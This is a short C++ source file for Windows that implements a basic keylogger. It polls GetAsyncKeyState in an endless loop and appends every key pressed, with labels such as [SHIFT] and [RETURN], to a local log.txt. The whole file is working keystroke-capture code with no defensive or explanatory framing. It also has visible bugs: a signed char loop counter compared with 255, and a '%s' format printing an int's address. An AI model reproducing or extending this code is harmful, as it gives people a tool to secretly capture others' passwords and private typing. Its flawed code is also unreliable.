#include <iostream>
#include <Windows.h>

int Save(int _key, const char* file);

int main()
{
    char i;

    while (true)
    {
        for (i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767) //checks for button press
            {
                Save(i, "log.txt");
            }
        }
    }

    return 0;
}

int Save(int _key, const char* file)
{
    std::cout << _key << std::endl;

    FILE* OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+");
    switch (_key)
    {
    case VK_SHIFT:
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
        break;
    case VK_BACK:
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
        break;
    case VK_LBUTTON:
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
        break;
    case VK_RETURN:
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
        break;
    case VK_ESCAPE:
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
        break;
    case VK_TAB:
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
        break;
    case VK_CAPITAL:
        fprintf(OUTPUT_FILE, "%s", "[CAPITAL]");
        break;
    case VK_UP:
        fprintf(OUTPUT_FILE, "%s", "[UP]");
        break;
    case VK_DOWN:
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
        break;
    case VK_LEFT:
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
        break;
    case VK_RIGHT:
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
        break;
    case VK_CONTROL:
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
        break;
    case VK_MENU:
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
        break;
    }

    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);

    return 0;
}